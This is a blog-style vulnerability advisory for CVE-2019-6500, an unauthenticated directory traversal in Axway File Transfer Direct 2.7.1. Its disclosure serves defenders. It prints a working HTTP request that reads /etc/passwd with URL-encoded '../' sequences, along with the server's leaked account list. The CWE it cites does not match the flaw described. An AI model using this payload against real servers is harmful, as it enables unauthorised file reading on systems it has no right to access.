---
layout: post
title:  "Directory Traversal in Axway File Transfer Direct"
date:   2019-01-20 19:51:02 +0700 
categories: [cve]
---

* CVE ID: CVE-2019-6500
* CWE ID: CWE-259

Vendor: Axway

Product: Axway File Transfer Direct, (The product is discontinued. Use the lastest version of this product.)

Version affected:  2.7.1

Axway is a software and services company registered in France with headquarters in Phoenix, Arizona. Established in 2001, Axway serves more than 11,000 organisations in 100 countries, with offices around the globe. Their award-winning products, solutions and services enable the business-critical transactions required to accelerate performance within and among enterprises - while providing management, security and governance on interactions throughout business networks.

#### Product description:

File Transfer Direct is an ad hoc file exchange solution that brings enterprise-class managed file transfer (MFT) capabilities to familiar email interfaces and web-based clients. File Transfer Direct transparently applies administrator-defined policies while adding the security and audit capabilities required for corporate governance and regulatory compliance.

#### Finding:

The unauthenticated Directory Traversal vulnerability can be exploited by issuing a specially crafted HTTP GET request utilizing a simple bypass, %2e%2e instead of (/),URL encoding.

Example:
{% highlight ruby %}

REQUEST:
GET /h2hdocumentation//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: a.b.c.d
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
{% endhighlight %}

{% highlight ruby %}

RESPONSE:
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 1713
Date: Tue, 23 Jan 2018 03:42:11 GMT
Connection: close

root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/etc/news:
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
pcap:x:77:77::/var/arpwatch:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
clam:x:100:102:Clam Anti Virus Checker:/var/clamav:/sbin/nologin
nocpulse:x:101:103:NOCpulse user:/var/lib/nocpulse:/bin/bash
hpsmh:x:500:500::/opt/hp/hpsmh:/sbin/nologin
ftd:x:20230:20000:ftd:/home/ftd:/bin/bash
nrpe:*:20231:20231:nrpe:/home/nrpe:/sbin/nologin
tss:x:102:105:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
stunnel:x:20009:20011:user stunnel:/dev/null:/bin/false
_lldpd:x:103:501::/home/_lldpd:/bin/bash
{% endhighlight %}

#### References:
1. https://www.owasp.org/index.php/Path_Traversal
2. https://www.axway.com/
3. Axway File Transfer Direct - http://infosightsol.com/wordpress/wp-content/uploads/2012/11/Axway_Datasheet_File_Transfer_Direct_EN.pdf
